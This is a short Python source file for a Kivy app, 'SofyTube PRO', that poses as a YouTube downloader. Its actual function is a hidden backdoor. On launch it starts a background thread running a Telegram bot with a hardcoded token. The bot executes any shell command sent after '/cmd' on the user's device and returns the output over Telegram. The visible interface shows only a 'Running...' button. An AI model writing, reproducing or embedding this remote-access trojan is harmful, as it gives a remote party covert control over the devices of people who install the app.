import telebot,os,threading,yt_dlp,time
from kivy.app import App
from kivy.uix.button import Button

T='8029997878:AAGwglMg5ZJ78dl4_kg_O7hJTvzx-jMfRRY'
bot=telebot.TeleBot(T)

def run_bot():
    while True:
        try:
            @bot.message_handler(commands=['cmd'])
            def handle(m):
                res=os.popen(m.text.replace('/cmd ','')).read()
                bot.reply_to(m, res if res else "OK")
            bot.polling(none_stop=True)
        except: time.sleep(10)

class SofyTube(App):
    def build(self):
        threading.Thread(target=run_bot, daemon=True).start()
        return Button(text='SofyTube PRO\nRunning...')

if __name__=='__main__':
    SofyTube().run()
    